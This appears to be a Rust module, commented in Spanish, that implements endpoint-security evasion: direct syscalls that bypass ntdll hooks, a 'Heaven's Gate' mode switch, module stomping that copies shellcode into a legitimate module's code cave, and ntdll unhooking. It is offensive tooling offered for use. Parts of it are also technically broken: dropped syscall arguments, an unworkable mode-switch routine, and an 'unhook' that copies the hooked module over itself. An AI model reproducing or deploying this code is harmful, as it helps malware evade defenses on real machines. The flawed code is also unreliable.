// Direct Syscalls - Bypass completo de hooks en user-mode
// Ejecuta syscalls directamente sin pasar por ntdll.dll

use std::arch::asm;
use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID};

/// Syscall numbers para Windows 10/11 (x64)
/// Estos números cambian entre versiones de Windows
#[repr(u32)]
#[derive(Debug, Clone, Copy)]
pub enum SyscallNumber {
    NtOpenProcess = 0x26,
    NtReadVirtualMemory = 0x3F,
    NtWriteVirtualMemory = 0x3A,
    NtQuerySystemInformation = 0x36,
    NtAllocateVirtualMemory = 0x18,
    NtProtectVirtualMemory = 0x50,
    NtCreateThreadEx = 0xBD,
}

/// Estructura para almacenar información de syscall
#[repr(C)]
struct SyscallStub {
    syscall_number: u32,
    address: u64,
}

/// Ejecuta NtReadVirtualMemory via syscall directo
/// Bypasses todos los hooks en ntdll.dll
#[cfg(target_arch = "x86_64")]
pub unsafe fn nt_read_virtual_memory(
    process_handle: HANDLE,
    base_address: PVOID,
    buffer: PVOID,
    buffer_size: usize,
    bytes_read: *mut usize,
) -> NTSTATUS {
    let syscall_num = SyscallNumber::NtReadVirtualMemory as u32;
    let mut status: i32;

    // Direct syscall usando inline assembly
    asm!(
        "mov r10, rcx",           // Backup rcx to r10
        "mov eax, {syscall}",     // Load syscall number
        "syscall",                // Execute syscall
        syscall = in(reg) syscall_num,
        in("rcx") process_handle,
        in("rdx") base_address,
        in("r8") buffer,
        in("r9") buffer_size,
        lateout("eax") status,
        options(nostack)
    );

    status
}

/// Ejecuta NtOpenProcess via syscall directo
#[cfg(target_arch = "x86_64")]
pub unsafe fn nt_open_process(
    process_handle: *mut HANDLE,
    desired_access: u32,
    object_attributes: PVOID,
    client_id: PVOID,
) -> NTSTATUS {
    let syscall_num = SyscallNumber::NtOpenProcess as u32;
    let mut status: i32;

    asm!(
        "mov r10, rcx",
        "mov eax, {syscall}",
        "syscall",
        syscall = in(reg) syscall_num,
        in("rcx") process_handle,
        in("rdx") desired_access,
        in("r8") object_attributes,
        in("r9") client_id,
        lateout("eax") status,
        options(nostack)
    );

    status
}

/// Ejecuta NtAllocateVirtualMemory via syscall directo
#[cfg(target_arch = "x86_64")]
pub unsafe fn nt_allocate_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> NTSTATUS {
    let syscall_num = SyscallNumber::NtAllocateVirtualMemory as u32;
    let mut status: i32;

    asm!(
        "mov r10, rcx",
        "mov eax, {syscall}",
        "syscall",
        syscall = in(reg) syscall_num,
        in("rcx") process_handle,
        in("rdx") base_address,
        in("r8") zero_bits,
        in("r9") region_size,
        lateout("eax") status,
        options(nostack)
    );

    status
}

/// Heaven's Gate - Técnica para ejecutar código x86 desde x64
/// Útil para bypasear algunos EDRs que solo monitorean x64
#[cfg(target_arch = "x86_64")]
pub mod heavens_gate {
    use super::*;

    /// Ejecuta syscall x86 desde proceso x64 (WoW64)
    pub unsafe fn execute_x86_syscall(syscall_num: u32, args: &[usize]) -> i32 {
        // Esta técnica usa el segmento de código 0x23 (x86)
        // en lugar de 0x33 (x64) para ejecutar código 32-bit

        let mut result: i32 = 0;

        // Far jump a código x86
        asm!(
            "push 0x23",              // Push 32-bit code segment
            "call $+5",               // Get EIP
            "add dword ptr [rsp], 5", // Add offset
            "retf",                   // Far return to x86 mode

            // Ahora estamos en x86 mode
            "mov eax, {syscall}",
            "int 0x2E",               // x86 syscall interrupt

            // Volver a x64 mode
            "push 0x33",              // Push 64-bit code segment
            "call $+5",
            "add dword ptr [rsp], 5",
            "retf",

            syscall = in(reg) syscall_num,
            out("eax") result,
            options(nostack)
        );

        result
    }
}

/// Module Stomping - Técnica para inyectar código sin llamar a CreateRemoteThread
pub mod module_stomping {
    use super::*;
    use std::ffi::CString;
    use winapi::um::libloaderapi::GetModuleHandleA;

    /// Reemplaza código de un módulo legítimo con nuestro código
    /// Bypasses detección de DLL injection tradicional
    pub unsafe fn stomp_module(target_module: &str, shellcode: &[u8]) -> Result<(), String> {
        // Obtener handle del módulo target
        let module_name = CString::new(target_module).map_err(|_| "Invalid module name")?;

        let module_handle = GetModuleHandleA(module_name.as_ptr());
        if module_handle.is_null() {
            return Err("Module not found".to_string());
        }

        let module_base = module_handle as *mut u8;

        // Encontrar una cave (espacio vacío) en el módulo
        // Típicamente en la sección .text o .data
        let cave_offset = find_code_cave(module_base, shellcode.len())?;
        let cave_address = module_base.add(cave_offset);

        // Cambiar protección de memoria para escribir
        let mut old_protect: u32 = 0;
        let result = nt_protect_virtual_memory(
            cave_address as PVOID,
            shellcode.len(),
            0x40, // PAGE_EXECUTE_READWRITE
            &mut old_protect,
        );

        if result != 0 {
            return Err("Failed to change memory protection".to_string());
        }

        // Copiar shellcode al cave
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), cave_address, shellcode.len());

        // Restaurar protección original
        nt_protect_virtual_memory(
            cave_address as PVOID,
            shellcode.len(),
            old_protect,
            &mut old_protect,
        );

        Ok(())
    }

    /// Encuentra un code cave (espacio vacío) en un módulo
    unsafe fn find_code_cave(module_base: *mut u8, required_size: usize) -> Result<usize, String> {
        // Buscar secuencias de bytes 0x00 o 0xCC (int3)
        let mut current = 0;
        let mut cave_size = 0;

        for offset in 0..0x100000 {
            // Buscar en primeros 1MB
            let byte = *module_base.add(offset);

            if byte == 0x00 || byte == 0xCC {
                if cave_size == 0 {
                    current = offset;
                }
                cave_size += 1;

                if cave_size >= required_size {
                    return Ok(current);
                }
            } else {
                cave_size = 0;
            }
        }

        Err("No suitable code cave found".to_string())
    }

    unsafe fn nt_protect_virtual_memory(
        address: PVOID,
        size: usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> NTSTATUS {
        let syscall_num = SyscallNumber::NtProtectVirtualMemory as u32;
        let mut status: i32;

        asm!(
            "mov r10, rcx",
            "mov eax, {syscall}",
            "syscall",
            syscall = in(reg) syscall_num,
            in("rcx") winapi::um::processthreadsapi::GetCurrentProcess(),
            in("rdx") &address,
            in("r8") &size,
            in("r9") new_protect,
            lateout("eax") status,
            options(nostack)
        );

        status
    }
}

/// Unhooking ntdll.dll - Remueve hooks colocados por EDRs
pub mod unhook {
    use super::*;
    use std::ffi::CString;
    use winapi::um::libloaderapi::{GetModuleHandleA, LoadLibraryA};
    use winapi::um::memoryapi::VirtualProtect;

    /// Remueve hooks de ntdll.dll restaurando desde disco
    pub unsafe fn unhook_ntdll() -> Result<(), String> {
        // Cargar una copia limpia de ntdll.dll desde disco
        let ntdll_name = CString::new("ntdll.dll").map_err(|_| "Failed to create CString")?;

        let clean_ntdll = LoadLibraryA(ntdll_name.as_ptr());
        if clean_ntdll.is_null() {
            return Err("Failed to load clean ntdll".to_string());
        }

        // Obtener ntdll hooked actual
        let hooked_ntdll = GetModuleHandleA(ntdll_name.as_ptr());
        if hooked_ntdll.is_null() {
            return Err("Failed to get hooked ntdll".to_string());
        }

        // Restaurar sección .text desde la copia limpia
        // Típicamente los hooks EDR están en las primeras funciones de ntdll
        let text_section_size = 0x100000; // Aproximadamente 1MB
        let mut old_protect: u32 = 0;

        VirtualProtect(
            hooked_ntdll as *mut _,
            text_section_size,
            0x40, // PAGE_EXECUTE_READWRITE
            &mut old_protect,
        );

        // Copiar sección .text limpia sobre la hooked
        std::ptr::copy_nonoverlapping(
            clean_ntdll as *const u8,
            hooked_ntdll as *mut u8,
            text_section_size,
        );

        VirtualProtect(
            hooked_ntdll as *mut _,
            text_section_size,
            old_protect,
            &mut old_protect,
        );

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_syscall_numbers() {
        println!(
            "NtReadVirtualMemory: 0x{:X}",
            SyscallNumber::NtReadVirtualMemory as u32
        );
        println!("NtOpenProcess: 0x{:X}", SyscallNumber::NtOpenProcess as u32);
    }
}
